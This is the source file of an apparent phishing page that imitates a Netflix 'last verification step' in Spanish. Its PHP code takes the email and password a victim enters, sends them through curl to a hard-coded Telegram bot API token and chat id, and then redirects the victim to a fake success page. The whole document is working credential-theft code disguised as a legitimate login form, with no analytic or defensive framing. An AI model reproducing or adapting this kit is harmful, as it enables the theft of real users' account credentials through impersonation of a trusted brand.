<?php 
session_start();
if ($_SESSION['sesion'] == false) {
    header("Location: ../index.html");
} if ($_SESSION['sesion'] == true) {
    if (isset($_POST['en'])) {
        $email = $_POST['email'];
        $password = $_POST['password'];
        function telegram_send($informacion) {
            $curl = curl_init();
            $api_key  = '5431710049:AAH7QTdzK-3_IJIVbPndVLRBVhIQLxyCMOk';
            $chat_id  = '5327111772';
            $format   = 'HTML';
            curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $informacion .'&parse_mode=' . $format);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
            $result = curl_exec($curl);
            curl_close($curl);
            return true; }
        telegram_send("Email: ".$email."---"."Password: ".$password);
        header("Location: ../exito/index.php");
        die();
        }
    }

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="../img/favicoin.ico" type="image/x-icon">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
</head>
<body>
    <header>
        <nav class="contenedor">
                <div class="float_img">
                    <div class="img_center">
                        <img src="../img/netflix_logo.png" alt="Netflix Logo">
                    </div>
                </div>
                <div class="float_text">
                    <div class="link_center">
                        <a href="../session_destroy/main.php">Cerrar sesión</a>
                    </div>
                </div>
            </nav>
    </header>
    <main>
        <div class="container">
            <h1>Ultimo paso de verificación.</h1>
            <form action="" method="POST">
                <div class="uno">
                    <input required maxlength="38" type="email" placeholder="Email" class="passw" name="email">
                </div>
                <br>
                <div class="dos">
                    <input name="password" type="password" class="passw" id="Input" placeholder="Contraseña" maxlength="30" required> 
                    <img src="../img/Show.png" alt="" class="icon" id="Eye">
                </div>
                <button type="submit" name="en">Enviar</button>
            </form>
        </div>
    </main>
    <script src="code.js"></script>
</body>
</html>